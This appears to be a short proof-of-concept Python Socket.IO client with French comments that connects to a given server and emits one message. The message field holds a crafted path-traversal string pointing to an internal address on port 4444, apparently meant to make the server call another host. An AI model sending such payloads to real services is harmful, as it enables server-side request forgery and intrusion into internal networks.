import socketio
import argparse

parser = argparse.ArgumentParser(description='Client Socket.IO avec gestion des messages.')
parser.add_argument('--url', type=str, required=True, help='URL du serveur Socket.IO à contacter')
args = parser.parse_args()

sio = socketio.Client()

@sio.event
def connect():
    print("Connexion au serveur réussie!")

@sio.event
def disconnect():
    print("Déconnecté du serveur")

@sio.event
def response(data):
    print(f"Réponse du serveur: {data}")

# Envoyer un message au serveur
def send_msg(report, uuid, message):
    sio.emit('message', {
        'report': report,
        'uuid': uuid,
        'message': message
    })

# Connexion au serveur Socket.IO
if __name__ == '__main__':
    try:
        # Connexion au serveur avec l'URL et un chemin spécifique si fourni
        sio.connect(args.url)
        
        # Simulation d'envoi de message
        send_msg(1, "123e4567-e89b-12d3-a456-426614174000", "123e4567-e89b-12d3-a456-426614174000/../..//192.168.1.40:4444/socket.io/?EIO=4&data=a")

        # Rester connecté pour écouter les messages
        sio.wait()

    except Exception as e:
        print(f"Erreur lors de la connexion: {e}")
